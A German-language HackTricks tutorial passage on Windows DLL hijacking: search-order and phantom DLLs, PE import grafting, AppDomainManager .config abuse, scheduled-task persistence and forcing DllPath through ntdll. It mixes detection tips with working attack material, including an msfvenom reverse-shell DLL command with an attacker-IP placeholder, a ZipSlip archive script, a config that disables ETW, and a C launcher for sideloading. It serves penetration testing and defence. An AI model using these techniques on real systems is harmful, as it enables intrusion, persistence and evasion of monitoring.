# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Bei DLL Hijacking wird eine vertrauenswürdige Anwendung dazu gebracht, eine schädliche DLL zu laden. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Diese werden hauptsächlich für die Codeausführung und Persistenz und seltener für Privilegieneskalation eingesetzt. Obwohl hier der Schwerpunkt auf der Privilegieneskalation liegt, bleibt die Methode des Hijackings unabhängig vom Ziel gleich.

### Häufige Techniken

Für DLL Hijacking kommen verschiedene Methoden zum Einsatz. Wie effektiv sie sind, hängt davon ab, wie die Anwendung DLLs lädt:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine legitime DLL wird durch eine schädliche ersetzt. Optional kann DLL Proxying verwendet werden, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL Search Order Hijacking**: Die schädliche DLL wird in einem Suchpfad vor der legitimen platziert, wodurch das Suchmuster der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Für eine Anwendung wird eine schädliche DLL erstellt, die diese lädt, weil sie annimmt, dass es sich um eine nicht vorhandene erforderliche DLL handelt.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder `.exe.manifest`- bzw. `.exe.local`-Dateien werden geändert, um die Anwendung zur schädlichen DLL umzuleiten.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch eine schädliche ersetzt. Diese Methode wird oft mit DLL Side-Loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die schädliche DLL wird zusammen mit der kopierten Anwendung in einem benutzergesteuerten Verzeichnis platziert. Das ähnelt Techniken zur Binary Proxy Execution.

Eine Anwendung kann auch **einen eigenen DLL-Loader** implementieren. Ein privilegierter Prozess kann ein untergeordnetes Verzeichnis wie `Libraries` oder `Plugins` durchsuchen und eine ausgewählte DLL an einen Hilfsprozess übergeben, unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien in genau diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine Prüfung betrachtet werden: Bestätigen Sie die Prozessidentität, die effektive ACL des Verzeichnisses, die Dateiauswahlregel und einen erreichbaren Ladevorgang. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Beim klassischen Side-Loading bleibt die vertrauenswürdige PE-Datei unverändert; stattdessen wird die DLL-Namensauflösung ausgenutzt. **Import grafting** verändert hingegen eine PE-Datei, die bereits vom vertrauenswürdigen Programm geladen wird. Der Angreifer fügt einen Import-Deskriptor sowie die zugehörigen Lookup-/IAT-Einträge für eine vom Angreifer kontrollierte DLL hinzu. Wenn Windows diese Abhängigkeit rekursiv auflöst, ordnet es die hinzugefügte DLL ein und führt deren Initialisierungscode innerhalb des ansonsten legitimen Prozesses aus. Dabei handelt es sich um eine Änderung der PE-Datei auf der Festplatte, nicht um denselben Vorgang wie das Ersetzen eines IAT-Funktionszeigers zur Laufzeit durch einen Runtime-Hook.<sup>[[31]](#references)[[32]](#references)</sup>

Die veränderte PE-Datei kann eine zwischengeschaltete Hersteller-DLL sein und muss nicht die vom Benutzer oder vom Task Scheduler gestartete ausführbare Datei sein. Eine wiederverwendbare Angriffskette sieht wie folgt aus:<sup>[[32]](#references)</sup>

1. Kopieren Sie die legitime ausführbare Datei und ihre Abhängigkeiten in ein vom Angreifer kontrolliertes Verzeichnis.
2. Ändern Sie die Importstrukturen einer Abhängigkeit so, dass sie auf die schädliche DLL verweisen, während die erwarteten Exporte und das normale Verhalten der Abhängigkeit erhalten bleiben.
3. Konfigurieren Sie einen Autorun-Eintrag oder einen geplanten Task so, dass die legitime ausführbare Datei gestartet wird. Der Loader ordnet die veränderte Abhängigkeit und anschließend die neu importierte DLL ein. Informationen zur Auflistung von Tasks finden Sie unter [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Vermeiden Sie aufwendige Vorgänge in `DllMain`. Der beobachtete Loader erstellte einen Worker-Thread und setzte die stufenweise Entschlüsselung dort fort.

Dies unterscheidet sich von einer Supply-Chain-Kompromittierung auf Herstellerseite, wenn das Herstellerpaket sauber ist und die Importänderung erst nach der Installation erfolgt. Untersuchen Sie jedes Modul im bereitgestellten Verzeichnis, nicht nur die Host-EXE: Vergleichen Sie Importlisten und Hashes der Abhängigkeiten mit einer bekannten, unveränderten Installation, überprüfen Sie Signaturen und untersuchen Sie Hersteller-Binärdateien, die von unerwarteten beschreibbaren Speicherorten wie `C:\ProgramData` gestartet werden. Ein geplanter Task, der auf einen kopierten Crash-Reporter oder Updater in einem solchen Verzeichnis verweist, ist ein besonders nützlicher Ansatzpunkt.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL Side-Loading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Code eines Angreifers zu laden. Wenn es sich beim Ziel um eine **verwaltete** Anwendung handelt, berücksichtigt die CLR auch eine **Anwendungskonfigurationsdatei**, deren Name auf der ausführbaren Datei basiert (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** definiert werden. Verweist die Konfigurationsdatei auf eine vom Angreifer kontrollierte Assembly neben der EXE, lädt die CLR diese **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.<sup>[[24]](#references)</sup>

Laut dem Konfigurationsschema von Microsoft für .NET Framework müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Diese Technik ist **spezifisch für .NET Framework**. Sie basiert auf dem Parsen der CLR-Konfiguration, nicht auf der Win32-DLL-Suchreihenfolge.
- Beim Host muss es sich tatsächlich um eine **managed EXE** handeln. Schnelle Prüfung: `sigcheck -m target.exe`, `corflags target.exe` oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Name der Konfigurationsdatei muss exakt mit dem Namen der ausführbaren Datei übereinstimmen (`<binary>.config`) und sie befindet sich normalerweise **neben der EXE**.
- Das ist mit **signierten Microsoft-/Vendor-Binaries** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed Assembly im selben Prozess ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installer-/Update-Verzeichnis verfügst, kann AppDomainManager-Hijacking als **erste Stufe** eingesetzt werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader + Bootstrap für geplante Aufgaben

Ein praktisches Intrusion-Muster kombiniert eine vertrauenswürdige managed EXE mit einer bösartigen `*.config`-Datei und einer bösartigen AppDomainManager-DLL, die nur als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Der Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort, etwa `%USERPROFILE%\Downloads`.
2. Die angrenzende Konfigurationsdatei veranlasst die CLR, **vor Beginn der legitimen Anwendungslogik** die Assembly des Angreifers zu laden.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die Ausführung der zweiten Stufe nur aus `%LOCALAPPDATA%` zulassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die echte Payload in einen benutzerbeschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet Persistenz mit einer geplanten Aufgabe ein.

Warum diese Variante relevant ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die nur den Hash der Hauptdatei überprüft, die Kompromittierung möglicherweise übersieht.
- Eine einfache **pfadbasierte Anti-Analyse** ist verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, in den Temp-Ordner oder in einen Sandbox-Pfad kann die Angriffskette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein bleiben und wenig auffallen, während das eigentliche Implantat später heruntergeladen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig vorkommt:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Hinweise:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigungsstufe** für diesen Benutzer/diese Sitzung; allein dadurch wird keine garantierte SYSTEM-Eskalation erreicht.
- Diese Technik lässt sich oft besser als **Ausführung/Persistenz durch Missbrauch der .NET-Konfiguration** einordnen denn als klassisches Hijacking der DLL-Suchreihenfolge aufgrund einer fehlenden DLL, auch wenn Operatoren häufig beides kombinieren.

Erkennungshinweise:
- Signierte .NET-Executables, die aus **ZIP-Entpackungspfaden**, `Downloads`, `%TEMP%` oder anderen für Benutzer beschreibbaren Ordnern gestartet werden und eine **im selben Verzeichnis liegende** `<exe>.config` haben.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser- oder Hersteller-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, wenn der Pfad der Executable nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking eines bestehenden geplanten Tasks, um die Sideload-Kette erneut zu starten

Für Persistenz sollte man nicht nur nach dem **Erstellen eines neuen Tasks** suchen. Manche Intrusion-Sets warten, bis ein legitimer Installer einen **regulären Updater-Task** erstellt, und **schreiben dann die Task-Aktion um**, sodass Name, Autor und Trigger für Verteidiger vertraut bleiben.

Wiederverwendbarer Ablauf:
1. Installiere/führe die legitime Software aus und ermittle den Task, den sie normalerweise erstellt.
2. Exportiere das Task-XML und notiere die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetze nur die Aktion, sodass der Task deine **vertrauenswürdige Host-EXE** aus einem für Benutzer beschreibbaren Staging-Verzeichnis startet, die dann das echte Payload per Side-Loading oder AppDomain lädt.
4. Registriere denselben Task-Namen erneut, statt ein neues, offensichtliches Persistenzartefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (zum Beispiel wie ein Updater eines Herstellers).
- Der **Task Scheduler-Dienst** startet die Aufgabe. Bei der Validierung des übergeordneten Prozesses oder der Prozesskette wird daher oft die erwartete Zeitplan-Kette statt `explorer.exe` erkannt.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits existierte, deren Aktion nun aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Hunting-Ansatzpunkte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Löse einen Alarm aus, wenn eine **wie ein Hersteller-Updater wirkende Aufgabe** aus **benutzerbeschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine schrittweise Angriffskette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL-Sideloading kombiniert, findest du im folgenden Ablauf.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Eine per Sideloading geladene Stage an die Service-Befehlszeile binden

Eine per Sideloading geladene DLL kann mehr als den erwarteten Host-EXE- und DLL-Namen voraussetzen. Mandiant beschrieb einen Loader, der die Payload-Entschlüsselung an ein Befehlszeilenargument und den Namen der Host-Executable bindet.<sup>[[33]](#references)</sup> In einer späteren servicegestützten Angriffskette lud ein kopierter, legitimer Host eine benachbarte `mscoree.dll`, die `LockClrVersion` exportierte und ihre eingebettete Stage erst entschlüsselte, nachdem sie einen AES-128-Schlüssel aus dem Service-Argument und dem Basisnamen der Host-Executable abgeleitet hatte. Jede Eingabe wurde auf 16 Byte gekürzt oder mit NUL-Bytes aufgefüllt; der Schlüssel wurde byteweise als `argument XOR embedded_key XOR executable_basename` gebildet. Anschließend wurde die Payload ohne Padding mit AES-CBC entschlüsselt. Wird der Host umbenannt oder ohne das erwartete Argument gestartet, ändert sich der Schlüssel und die Stage kann nicht entschlüsselt werden, selbst wenn die DLL weiterhin geladen wird. Bei der Reproduktion oder Analyse dieser Variante müssen das genaue Befehlszeilenargument und der Basisname erhalten bleiben.<sup>[[34]](#references)</sup>

Dies ist ein **Payload-Gate auf Basis von gewöhnlichem DLL-Sideloading**, keine neue DLL-Suchreihenfolge und für sich genommen auch kein Privilege-Escalation-Primitiv. Der Sicherheitskontext des Service bestimmt die resultierende Berechtigungsstufe. Der [GitHub-Issue-/Datei-C2-Ablauf](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) beschreibt den späteren Transport separat.<sup>[[34]](#references)</sup>

## Fehlende DLLs finden

Die häufigste Methode, fehlende DLLs auf einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und die **folgenden 2 Filter** einzustellen:

![Gängige Techniken – Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs auf einem System zu finden, besteht darin, procmon von Sysinternals auszuführen und die folgenden 2 Filter einzustellen](<../../../images/image (961).png>)

![Gängige Techniken – Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs auf einem System zu finden, besteht darin, procmon von Sysinternals auszuführen und die folgenden 2 Filter einzustellen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Gängige Techniken – Fehlende DLLs finden: und nur die File System Activity anzuzeigen](<../../../images/image (153).png>)

Wenn du **allgemein nach fehlenden DLLs** suchst, **lässt** du das Tool einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten Executable** suchst, setze einen weiteren Filter wie **"Process Name" "contains" `<exec name>`**, führe sie aus und beende die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um Privilegien zu erweitern, suche nach einer **DLL, die ein privilegierter Prozess von einem beschreibbaren Speicherort zu laden versucht**. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du eine genaue Beschreibung, wie DLLs geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie eine Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge durchlaufen. DLL-Hijacking tritt auf, wenn eine schädliche DLL gezielt in einem dieser Verzeichnisse platziert wird, sodass sie vor der legitimen DLL geladen wird. Um das zu verhindern, sollte die Anwendung beim Verweisen auf benötigte DLLs absolute Pfade verwenden.

Die **DLL-Suchreihenfolge auf 32-Bit-Systemen** ist unten aufgeführt:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, mit der sich der Pfad dieses Verzeichnisses abrufen lässt, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die in der Umgebungsvariable PATH aufgeführten Verzeichnisse. Beachte, dass der anwendungsspezifische Pfad aus dem Registrierungsschlüssel **App Paths** nicht enthalten ist. Der Schlüssel **App Paths** wird bei der Ermittlung des DLL-Suchpfads nicht verwendet.

Das ist die **Standard**-Suchreihenfolge, wenn **SafeDllSearchMode** aktiviert ist. Ist diese Funktion deaktiviert, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um sie zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig ist er aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des Executable-Moduls, das **LoadLibraryEx** lädt.

Schließlich kann eine DLL auch über ihren absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows nur an diesem Pfad nach der DLL selbst. Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erläutern.

### Einen beliebigen Schreibzugriff zu einem Hijack einer fehlenden DLL verketten

**Verwandte Technik:** [Mount-Point-Wechsel mit Oplock-Sperre gegen privilegierte Remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu erfassen, nach denen der Prozess sucht, die er aber nicht finden kann.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei **zeitgesteuert oder als Service** ausgeführt wird, wird eine DLL mit einem dieser Namen, die im **Anwendungsverzeichnis** (Suchpfad-Eintrag Nr. 1) abgelegt wird, beim nächsten Start geladen. In einem Fall mit einem .NET-Scanner suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitiv ein **ZipSlip-artiger beliebiger Schreibzugriff** ist, erstelle eine ZIP-Datei mit einem Eintrag, der aus dem Extraktionsverzeichnis herausführt, sodass die DLL im Anwendungsverzeichnis landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Übermittle das Archiv an den überwachten Posteingang bzw. die Freigabe. Wenn die geplante Aufgabe den Prozess erneut startet, lädt dieser die schädliche DLL und führt deinen Code als Dienstkonto aus.

### Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen

Eine fortgeschrittene Methode, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses über die nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Wird hier ein vom Angreifer kontrolliertes Verzeichnis angegeben, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (ohne absoluten Pfad und ohne sichere Ladeflags), dazu gezwungen werden, eine schädliche DLL aus diesem Verzeichnis zu laden.

Grundidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So ist zuverlässiges Sideloading möglich, selbst wenn sich die schädliche DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies wirkt sich auf den erstellten Kindprozess aus. Das unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder LoadLibrary dafür verwenden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht gekapert werden. Weitergeleitete Exporte und SxS können die Reihenfolge ändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Beispiel für die praktische Verwendung
- Platziere eine bösartige xmllite.dll (die erforderlichen Funktionen exportierend oder an die echte DLL weiterleitend) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binärdatei, von der bekannt ist, dass sie mithilfe der oben beschriebenen Technik xmllite.dll anhand ihres Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloadet deine DLL.

Diese Technik wurde in freier Wildbahn beobachtet, um mehrstufige Sideloading-Ketten anzutreiben: Ein initialer Launcher legt eine Hilfs-DLL ab, die anschließend eine Microsoft-signierte, hijackbare Binärdatei mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking über `.exe.config`

Bei Zielen mit **.NET Framework** ist Sideloading **vor `Main()`** möglich, ohne den Speicher zu patchen, indem die anwendungsseitige **`.exe.config`**-Datei missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer bösartigen Config-Datei und einer oder mehreren vom Angreifer kontrollierten Assemblys.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE wird gestartet und die **CLR liest `<exe>.config`**.
2. Die Config setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, sodass die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der bösartige Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Config kann die CLR dazu zwingen, zuerst lokale Assemblys aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), und die Runtime-Validierung bzw. Telemetrie ohne Inline-Patching abschwächen.

Muster im Stil von Kampagnen (die genaue Verschachtelung kann je nach Direktive/CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum dies nützlich ist:
- **`<probing privatePath="."/>`** beschränkt die Assembly-Auflösung auf das Anwendungsverzeichnis und macht den Ordner zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifer-Code, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-App ermöglichen, nicht signierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert Weiterleitungen durch Publisher-Policies zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sorgt für eine deterministischere Runtime-Auswahl.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, da die **CLR ihre eigene ETW-Sichtbarkeit über die Konfiguration deaktiviert**, statt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehen:
- Stufe 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Stufe 2 kopiert sie in einen glaubwürdig wirkenden **AppData-Update**-Ordner, benennt den Host beispielsweise in `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Stufe 3 überprüft den Ausführungskontext (zum Beispiel, ob der erwartete übergeordnete Prozess `svchost.exe` vom Task Scheduler ist), bevor die finale RAT-DLL bzw. der finale Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET-Executables**, die an verdächtigen, benachbarten **`.config`**-Dateien in benutzerschreibbaren Speicherorten ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Übergeordnete und untergeordnete Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der sofort nicht vom Anbieter stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge beschrieben:

